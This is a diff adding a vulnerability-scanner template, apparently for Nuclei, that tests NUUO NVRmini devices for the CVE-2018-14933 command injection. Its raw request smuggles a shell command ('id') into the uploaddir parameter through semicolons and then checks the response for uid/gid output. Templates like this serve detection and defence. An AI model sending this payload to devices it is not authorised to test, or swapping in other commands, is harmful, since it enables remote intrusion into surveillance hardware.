@@ -1,0 +1,32 @@
+id: nvrmini-rce-cve-2018-14933
+
+info:
+  name: NVRmini RCE (CVE-2018-14933)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    `upgrade_handle.php` on NUUO NVRmini devices allows Remote Command Execution via shell metacharacters in the `uploaddir` parameter for a `writeuploaddir` command.
+  tags: rce
+  reference:
+    - https://www.exploit-db.com/exploits/46340
+
+variables:
+  cmd: "id"
+
+http:
+  - raw:
+      - |
+        GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir='%3B{{cmd}}%3B' HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
